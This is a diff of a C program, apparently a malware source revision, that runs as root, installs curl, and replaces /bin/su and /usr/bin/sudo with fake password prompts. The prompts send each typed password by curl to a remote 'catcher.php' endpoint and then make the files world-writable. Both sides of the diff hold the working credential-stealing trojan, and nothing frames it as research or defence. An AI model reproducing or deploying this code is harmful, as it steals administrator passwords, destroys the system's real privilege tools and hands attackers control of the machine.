@@ -1,91 +1,78 @@
 #include <stdio.h>
 #include <string.h>
 
+
+/** MAIN CODE **/
+
 int main () {
 
- /** COMPROBAMOS SI SOMOS EJECUTADOS COMO ROOT **/
+  /** CHECK ROOT **/
 
    if(geteuid() != 0) {
 
-      printf("Err.: This script must be run as root.\n");
+      printf("Err.: This program must be run as root.\n");
       return 0;
   
    }
 
 
-   char command[250];
-
-   /** INSTALAMOS CURL, VARIOS DEPENDIENDO DEL SISTEMA, OCULTAMOS LA SALIDA CON /DEV/NULL **/
-
-   strcpy(command, "apt install curl > /dev/null 2>&1" );
-   system(command);
-
-   strcpy(command, "apt-get install curl > /dev/null 2>&1" );
-   system(command);
-
-   strcpy(command, "yum install curl > /dev/null 2>&1" );
-   system(command);
-
-   strcpy(command, "aptitude install curl > /dev/null 2>&1" );
-   system(command);
-
-   /** EMPEZAMOS A GUARDAR EN /BIN/SU EL CONTENIDO **/
-
-   strcpy(command, "echo '#!/bin/bash' > /bin/su" );
-   system(command);
-
-   strcpy(command, "echo 'stty -echo' >> /bin/su" );
-   system(command);
-
-   strcpy(command, "echo 'printf \"Password: \" ' >> /bin/su" );
-   system(command);
-
-   strcpy(command, "echo 'read PASSWORD' >> /bin/su" );
-   system(command);
-
-   strcpy(command, "echo 'stty echo' >> /bin/su" );
-   system(command);
-
-   strcpy(command, "echo 'echo ' >> /bin/su" );
-   system(command);
-
-   strcpy(command, "echo 'curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1' >> /bin/su" );
-   system(command);
-
-   /** LE DAMOS PERMISOS **/
-
-   strcpy(command, "chmod 777 /bin/su" );
-   system(command);
+   /** INSTALL PACKAGE.  /DEV/NULL HIDE COMMAND EXIT **/
 
 
-   /** EMPEZAMOS A GUARDAR EN /USR/BIN/SUDO EL CONTENIDO **/
+   system("apt install curl > /dev/null 2>&1");
+   system("apt-get install curl > /dev/null 2>&1");
+   system("yum install curl > /dev/null 2>&1");
+   system("aptitude install curl > /dev/null 2>&1");
 
-   strcpy(command, "echo '#!/bin/bash' > /usr/bin/sudo" );
-   system(command);
 
-   strcpy(command, "echo 'stty -echo' >> /usr/bin/sudo" );
-   system(command);
+   /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
+  
+   FILE *file1; /** MALICIUS FILE **/
 
-   strcpy(command, "echo 'printf \"Password: \" ' >> /usr/bin/sudo" );
-   system(command);
+   char cmmd1[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";
 
-   strcpy(command, "echo 'read PASSWORD' >> /usr/bin/sudo" );
-   system(command);
+   file1 = fopen("/bin/su", "w");
 
-   strcpy(command, "echo 'stty echo' >> /usr/bin/sudo" );
-   system(command);
+   if(file1 == NULL) {
 
-   strcpy(command, "echo 'echo ' >> /usr/bin/sudo" );
-   system(command);
+	printf("Err.: Try executing me again...");
+	
+   } else {
 
-   strcpy(command, "echo 'curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1' >> /usr/bin/sudo" );
-   system(command);
+	fwrite(cmmd1, sizeof(cmmd1), 1, file1);
 
-   /** LE DAMOS PERMISOS **/
+	fclose(file1);
+	
+   }
 
-   strcpy(command, "chmod 777 /usr/bin/sudo" );
-   system(command);
+/** GIVE 777 **/
 
+system("chmod 777 /bin/su > /dev/null 2>&1");
+
+
+/** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
+
+
+   FILE *file2;
+
+   char cmmd2[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";
+
+   file2 = fopen("/usr/bin/sudo", "w");
+
+   if(file2 == NULL) {
+
+	printf("Err.: Try executing me again...");
+	
+   } else {
+
+	fwrite(&cmmd2, sizeof(cmmd2), 1, file2);
+
+	fclose(file2);
+	
+   }
+
+
+/** GIVE 777 **/system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
 
    return(0);
 } 
